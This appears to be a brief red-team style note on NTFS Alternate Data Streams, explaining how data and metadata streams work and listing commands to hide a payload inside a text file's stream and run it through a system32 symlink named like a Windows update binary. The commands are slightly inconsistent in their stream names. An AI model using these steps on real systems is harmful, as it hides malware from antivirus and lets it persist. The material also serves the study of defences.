


Alternate Data Streams
=
Hiding malicious payload within a legitimate file of file system

NTFS file attribute (new technology file system)

any file created on NTFS formatted drive will have:
- data stream - default stream that contains the data of file
- resource stream - contains meta data of the file

ADS can be used to hide malicious code or executables in resource stream to evade detection from AVs

Method
=
1. `payload.exe > windowslog.txt:winpeas.exe` - hides payload into windowslog as secret file named winpeas.exe
2. payload.exe can then be deleted as it is now hidden in windowslog
3. `cd windows\system32`
4. `mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.txt`
5. `wupdate` 